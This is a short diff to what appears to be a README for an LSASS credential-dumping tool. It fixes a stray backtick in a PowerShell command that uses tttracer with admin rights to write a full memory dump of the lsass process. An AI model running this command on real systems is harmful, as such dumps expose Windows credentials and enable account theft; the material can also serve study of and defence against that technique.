@@ -27,7 +27,7 @@ https://github.com/uf0o/PykDumper/blob/master/PyKDumper/PyKDumper3.py
 ### 1. Create dump file (as admin privilege)
 ```
 Powershell session 1: 
-tttracer -dumpfull -attach (Get-Process lsass | Select -expand id)`
+tttracer -dumpfull -attach (Get-Process lsass | Select -expand id)
 ```
 
 Wait 3-6s please...
